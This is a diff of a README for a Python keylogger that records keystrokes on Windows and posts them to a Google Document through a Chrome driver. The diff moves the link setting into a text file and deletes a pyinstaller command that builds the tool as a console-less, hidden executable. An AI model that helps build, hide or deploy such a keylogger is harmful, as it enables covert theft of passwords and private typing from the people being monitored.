@@ -1,10 +1,7 @@
 Keylogger program written in Python.  This program will write keys entered on a computer and enter them into a Google Document.
 
-You can specify the document link by changing the doc_link variable.  This is a windows program, and all packages must be installed for it to correctly work.
+You can specify the document link by changing the contents of the doclink.txt file.  This is a windows program, and all packages must be installed for it to correctly work.
 The Chrome browser is also required to connect to the internet to write to the Google Document (as a Chrome driver is used for internet connection).
-
-To compile to a usable application on any compatible device, use the pyinstaller command:
-pyinstaller --onefile --icon="path\to\icon (optional)" keylog.py --noconsole
 
 NOTE: Do not edit the cleartext.txt file
 
